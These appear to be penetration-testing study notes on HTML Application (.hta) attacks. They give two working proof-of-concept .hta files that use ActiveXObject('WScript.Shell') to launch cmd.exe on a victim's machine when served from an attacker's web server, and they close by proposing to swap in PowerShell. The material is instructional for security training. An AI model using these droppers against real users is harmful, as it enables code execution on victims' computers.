Similar to an HTML page, HTML apps include:
html, body and script tages followed by JavaScript of VBScript code. 

Since the HTML app is executed outside the browser, we can use legacy and dangerous features usually blocked by the browser.

Ex. ActivexObjects, leveraging WScript (Windows Script Host) and the WScript Host Shell object. 

Once we instantiate and WScript Host Shell Object, we can invoke the *run* method to launch an app on the target amchine. 

PoC: .hta file to open cmd.exe
```
<html>
<body>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

If we place this code on Kali and serve it from an apache web server, the victim will receive a dialogue box asking what to do with it once they access the resource. 

A second dialgoue box will appear to due sandbox protection of IE called *Protected Mode* (enabled by default).

While **mshta.exe** is running, it keeps an additional dialogue box running. We can stop this with the **.close();** object method.

```
<html>
<head>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
```

That's great, but we need to turn this into an attack. Rather than launching cmd.exe, we can use PowerShell framework. 

